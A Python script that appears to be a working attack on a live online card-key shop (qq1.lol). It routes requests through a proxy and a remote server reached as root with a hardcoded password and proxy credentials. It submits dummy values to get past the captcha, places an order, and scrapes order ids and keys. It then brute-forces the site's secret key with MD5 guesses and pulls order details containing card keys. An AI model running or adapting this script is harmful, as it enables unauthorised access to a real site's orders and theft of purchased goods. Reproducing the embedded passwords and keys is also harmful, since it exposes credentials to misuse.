#!/usr/bin/env python3
"""qq1 same-session: pay -> query&data= -> extract showOrder(skey) -> order/kminfo"""
import hashlib
import json
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path("/workspace/results/qq1.lol")
LOG = OUT / "recheck3.log"
HITS = OUT / "recheck_hits.jsonl"
QG_KEY, QG_PWD = "C413ED6D", "344F550A6F8B"
JP_PASS, JP_HOST = "DX4LmrDaPfd9", "42.240.167.114"
JAR = "/tmp/qq1_recheck3.jar"
_px = None

WORDS = [
    "qq1", "buyi", "buyiq", "qqkqq", "830603", "faka", "123456", "admin", "888888", "666666",
    "syskey", "qq1.lol", "buyi123", "buyi888", "buyi666", "布衣", "QQKZC", "qqkzc", "rainbow",
    "mckuai", "epay", "secret", "password", "root", "abcdef", "ka1.one", "kln166", "fffzz",
]


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    with open(HITS, "a") as f:
        f.write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:350]}")


def ssh(script, timeout=55):
    return subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=timeout,
    ).stdout or ""


def proxy(force=False):
    global _px
    if _px and not force:
        return _px
    d = json.loads(ssh(f"curl -s 'https://share.proxy.qg.net/get?key={QG_KEY}&num=1'", 20))
    _px = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
    log(f"proxy {_px.split('@')[1]}")
    return _px


def curl(url, post=None, mt=30, force_px=False):
    px = proxy(force_px)
    hdr = "-H 'Referer: https://qq1.lol/' -H 'X-Requested-With: XMLHttpRequest'"
    pp = f"-X POST -H 'Content-Type: application/x-www-form-urlencoded' -d {shlex.quote(post)}" if post is not None else ""
    script = (
        f"curl -sk --max-time {mt} -x {shlex.quote(px)} -b {JAR} -c {JAR} -A 'Mozilla/5.0' "
        f"{hdr} {pp} -w '\\n__HTTP:%{{http_code}}' {shlex.quote(url)}"
    )
    out = ssh(script, mt + 30)
    if "__HTTP:" not in out:
        return out.strip(), "000"
    body, code = out.rsplit("__HTTP:", 1)
    return body.strip(), code.strip()


def reverse_syskey(oid, skey):
    for w in WORDS:
        if hashlib.md5(f"{oid}{w}{oid}".encode()).hexdigest() == skey:
            return w
        if hashlib.md5(f"{oid}{w}".encode()).hexdigest() == skey:
            return f"fmt2:{w}"
    return None


def main():
    log("=== RECHECK3 START ===")
    ssh(f"rm -f {JAR}")
    proxy(True)
    curl(f"{BASE}/")

    # buy page with retries
    buy = ""
    for i in range(5):
        buy, code = curl(f"{BASE}/?mod=buy&cid=4&tid=102", force_px=(i > 0))
        log(f"buy try{i} HTTP={code} len={len(buy)}")
        if len(buy) > 1000 and "hashsalt" in buy:
            break
        time.sleep(2)
    if "hashsalt" not in buy:
        log("FATAL no buy page")
        return

    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy).group(1)
    hs = subprocess.run(
        ["node", "-e", f"var hashsalt={re.search(r'var hashsalt=(.+);', buy).group(1)}; console.log(hashsalt)"],
        capture_output=True, text=True, timeout=8,
    ).stdout.strip()
    marker = f"m{int(time.time()) % 1000000}"
    log(f"csrf={csrf[:12]} hs={hs} marker={marker}")

    # create order
    pay, code = curl(
        f"{BASE}/ajax.php?act=pay",
        post=(
            f"tid=102&num=1&inputvalue={marker}&csrf_token={csrf}&hashsalt={hs}"
            "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan"
        ),
    )
    log(f"pay HTTP={code} body={str(pay)[:250]}")
    tn = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    tn = tn.group(1) if tn else None
    if not tn:
        log("FATAL pay failed")
        return

    # check session query page for recent orders (no data=)
    time.sleep(1)
    qp, code = curl(f"{BASE}/?mod=query")
    log(f"query blank HTTP={code} len={len(qp)}")
    (OUT / "recheck3_query_blank.html").write_text(qp or "")
    if "showOrder" in (qp or ""):
        hit("session_orders", "blank query", qp[:5000])
    if "没有任何订单" in (qp or ""):
        log("  session shows NO orders (cookiesid mismatch or unpaid hidden)")
    # look for our marker or trade_no in page
    if marker in (qp or "") or (tn and tn in (qp or "")):
        hit("session_has_order", marker, qp[:3000])

    # GET query with data=marker and data=trade_no
    for data in [marker, tn]:
        html, code = curl(f"{BASE}/?mod=query&data={quote(data)}")
        log(f"query data={data} HTTP={code} len={len(html)}")
        (OUT / f"recheck3_query_{data}.html").write_text(html or "")
        # real order rows have showOrder(
        matches = list(re.finditer(r"showOrder\(\s*['\"]?(\d+)['\"]?\s*,\s*['\"]([a-f0-9]+)['\"]", html or ""))
        if matches:
            for m in matches:
                oid, skey = m.group(1), m.group(2)
                hit("skey_found", f"id={oid} skey={skey} via={data}", m.group(0))
                skw = reverse_syskey(oid, skey)
                if skw:
                    hit("syskey", skw, skey)
                    (OUT / "SYS_KEY.txt").write_text(str(skw))
                # fetch order detail
                body, _ = curl(f"{BASE}/ajax.php?act=order", post=f"id={oid}&skey={skey}")
                log(f"  order detail: {str(body)[:300]}")
                if body and ("kminfo" in body or '"code":0' in body):
                    hit("order_detail", oid, body)
        else:
            # check empty / error messages
            if "没有任何" in (html or ""):
                log("  no orders in result")
            if "查不到" in (html or "") or "不存在" in (html or "") or "未找到" in (html or ""):
                log("  not found message")
            # dump relevant table section
            if "<tbody>" in (html or ""):
                tbody = (html or "").split("<tbody>")[1].split("</tbody>")[0]
                log(f"  tbody: {tbody[:300]}")
        time.sleep(1.5)

    # also try ajax query with type=1 trade_no in same session
    body, code = curl(f"{BASE}/ajax.php?act=query", post=f"qq={tn}&type=1&page=1")
    log(f"ajax type1 tn HTTP={code} body={str(body)[:250]}")
    if body and '"code":0' in body:
        hit("ajax_query", tn, body)

    body, code = curl(f"{BASE}/ajax.php?act=query", post=f"qq={marker}&page=1")
    log(f"ajax qq marker HTTP={code} body={str(body)[:250]}")
    if body and '"code":0' in body:
        hit("ajax_query", marker, body)

    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== RECHECK3 DONE hits={n} ===")


if __name__ == "__main__":
    main()
